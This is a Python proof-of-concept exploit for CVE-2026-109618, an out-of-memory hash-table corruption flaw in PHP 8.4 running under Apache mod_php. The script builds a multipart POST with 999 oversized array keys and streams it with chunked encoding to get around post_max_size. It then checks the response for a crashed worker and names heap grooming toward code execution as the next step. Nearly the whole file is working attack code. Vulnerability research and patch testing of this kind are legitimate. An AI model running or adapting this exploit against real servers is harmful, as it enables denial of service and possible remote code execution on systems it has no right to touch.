#!/usr/bin/env python3
"""
Base PoC for CVE-2026-109618 — OOM Hash Corruption in PHP

Proves the core primitive: triggering an OOM during $_POST hash table
insertion in _zend_hash_str_add_or_update_i().

Attack chain:
1. Send multipart POST via chunked encoding (bypasses post_max_size)
2. Use ~1000 fields with large string keys under array syntax
3. Each field triggers zend_string_init() in the hash insertion path
4. When total allocations exceed memory_limit, OOM fires via longjmp()
5. The bucket counter (nNumUsed) was already incremented, leaving an
   uninitialized bucket
6. php_request_shutdown() walks the hash table and hits the bad bucket

Target: PHP 8.4.26 + Apache mod_php (prefork), default configuration
"""

import argparse
import socket
import sys
import time


def build_oom_payload(memory_limit_mb=128):
    """Build multipart body to exhaust memory_limit during hash insertion.

    Each field like arr[LARGE_KEY] triggers:
      _zend_hash_str_add_or_update_i() →
        nNumUsed++ (line 962)
        nNumOfElements++ (line 963)
        zend_string_init(LARGE_KEY, len, ...) → emalloc → possible OOM

    Memory per field ≈ sizeof(zend_string) + key_len + sizeof(Bucket) + overhead
                     ≈ 24 + key_len + 32 + ~16 = key_len + 72

    With memory_limit=128M and ~1000 fields (max_input_vars):
      key_len = (128 * 1024 * 1024) / 1000 - 72 ≈ 134KB

    We slightly overshoot to ensure OOM hits on one of the last fields.
    The field whose zend_string_init() triggers OOM will leave the
    uninitialized bucket.
    """
    boundary = b"----CVE2026109618"
    target_bytes = memory_limit_mb * 1024 * 1024

    # Use 999 fields (stay just under max_input_vars=1000)
    # so the 1000th field is the one that triggers OOM
    num_fill_fields = 999
    # Slightly overshoot target to ensure OOM
    key_size = (target_bytes // num_fill_fields) + 512
    # But cap key size at a reasonable level for wire efficiency
    key_size = min(key_size, 200000)

    print(f"[*] Payload config: {num_fill_fields} fields, key_size={key_size} bytes")
    print(f"[*] Expected PHP memory: ~{(num_fill_fields * (key_size + 72)) / 1024 / 1024:.1f} MB")

    parts = []

    for i in range(num_fill_fields):
        # Use unique keys under a common array to hit the str key insertion path
        # Format: arr[AAAA...0001] where the key is padded to key_size
        key_data = f"{i:06d}" + "A" * (key_size - 6)
        field_name = f"a[{key_data}]"

        part = (
            b"--" + boundary + b"\r\n"
            b'Content-Disposition: form-data; name="' +
            field_name.encode() + b'"\r\n\r\n'
            b"x\r\n"
        )
        parts.append(part)

    # Final closing boundary
    parts.append(b"--" + boundary + b"--\r\n")

    body = b"".join(parts)
    print(f"[*] Wire payload size: {len(body) / 1024 / 1024:.1f} MB")
    return boundary, body


def send_chunked(host, port, path, boundary, body, timeout=120):
    """Send via chunked transfer encoding to bypass post_max_size."""
    content_type = f"multipart/form-data; boundary={boundary.decode()}"

    request_headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    print(f"[*] Connecting to {host}:{port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, int(port)))

    sock.sendall(request_headers)

    # Send body in chunks
    chunk_size = 65536
    sent = 0
    start = time.time()
    while sent < len(body):
        end = min(sent + chunk_size, len(body))
        chunk_data = body[sent:end]
        chunk_header = f"{len(chunk_data):x}\r\n".encode()
        sock.sendall(chunk_header + chunk_data + b"\r\n")
        sent = end
        elapsed = time.time() - start
        if sent % (10 * 1024 * 1024) < chunk_size:
            print(f"    Sent {sent/1024/1024:.1f} MB ({elapsed:.1f}s)")

    sock.sendall(b"0\r\n\r\n")
    elapsed = time.time() - start
    print(f"[*] Done sending {sent/1024/1024:.1f} MB in {elapsed:.1f}s")
    print(f"[*] Waiting for response...")

    response = b""
    try:
        while True:
            data = sock.recv(8192)
            if not data:
                break
            response += data
    except socket.timeout:
        print("[!] Response timed out")

    sock.close()
    return response


def analyze_response(response):
    """Check for OOM indicators."""
    if not response:
        print("[!] No response — worker likely crashed (SIGSEGV from bad bucket)")
        return True

    resp = response.decode("latin-1", errors="replace")
    status = resp.split("\r\n")[0] if "\r\n" in resp else resp[:100]
    print(f"[*] Status: {status}")

    # Look for memory exhaustion
    if "Allowed memory size" in resp:
        print("[+] CONFIRMED: PHP memory limit exhaustion")
        # Extract the error message
        for line in resp.split("\n"):
            if "Allowed memory size" in line:
                print(f"    {line.strip()[:200]}")
                break
        return True

    if "500" in status:
        print("[+] 500 Internal Server Error")
        if "Fatal error" in resp:
            for line in resp.split("\n"):
                if "Fatal error" in line:
                    print(f"    {line.strip()[:200]}")
                    break
        return True

    if "200" in status:
        # Check if POST was actually parsed (might have been rejected silently)
        if "PHP" in resp and "OK" in resp:
            print("[-] 200 OK — request parsed without OOM")
            return False

    print(f"[-] Unexpected: {status[:100]}")
    return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-109618 Base PoC")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", default="8080")
    parser.add_argument("--path", default="/index.php")
    parser.add_argument("--memory-limit", type=int, default=128,
                        help="Target memory_limit in MB")
    parser.add_argument("--timeout", type=int, default=120)
    args = parser.parse_args()

    print("[*] CVE-2026-109618 Base PoC — OOM Hash Corruption")
    print(f"[*] Target: {args.host}:{args.port}{args.path}")
    print(f"[*] Target memory_limit: {args.memory_limit}MB")
    print()

    boundary, body = build_oom_payload(args.memory_limit)
    print()
    response = send_chunked(args.host, args.port, args.path, boundary, body, args.timeout)
    print()
    success = analyze_response(response)

    if success:
        print()
        print("[+] === BASE PRIMITIVE CONFIRMED ===")
        print("[+] OOM triggered during _zend_hash_str_add_or_update_i()")
        print("[+] Uninitialized bucket exists when php_request_shutdown() runs")
        print("[*] Next: heap grooming to control bucket contents for code execution")
    else:
        print()
        print("[-] OOM not triggered. Check target config or adjust parameters.")

    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
